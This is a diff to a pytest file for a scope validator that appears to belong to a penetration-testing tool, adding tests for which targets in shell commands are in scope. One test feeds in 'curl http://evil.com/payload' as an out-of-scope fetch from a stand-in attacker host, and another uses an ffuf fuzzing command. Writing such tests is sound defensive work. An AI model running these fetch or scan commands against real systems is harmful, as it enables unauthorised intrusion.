@@ -2,8 +2,6 @@
 
 import ipaddress
 
-import pytest
-
 from app.services.tools.scope_validator import (
     is_target_in_scope,
     parse_scope,
@@ -79,6 +77,23 @@ class TestValidateCommandTarget:
     def test_no_targets_in_command(self):
         ok, reason = validate_command_target("whoami", ["10.0.0.0/24"])
         assert ok is True
+
+    def test_file_extensions_not_treated_as_domains(self):
+        """File names like common.txt should not trigger scope violations."""
+        result, reason = validate_command_target(
+            "ffuf -u http://172.21.0.50 -w /usr/share/seclists/common.txt -o output.json",
+            ["172.21.0.50"],
+        )
+        assert result is True
+
+    def test_real_domains_still_checked(self):
+        """Actual domains should still be validated against scope."""
+        result, reason = validate_command_target(
+            "curl http://evil.com/payload",
+            ["172.21.0.50"],
+        )
+        assert result is False
+        assert "evil.com" in reason
 
     def test_empty_scope(self):
         ok, reason = validate_command_target("nmap 10.0.0.1", [])
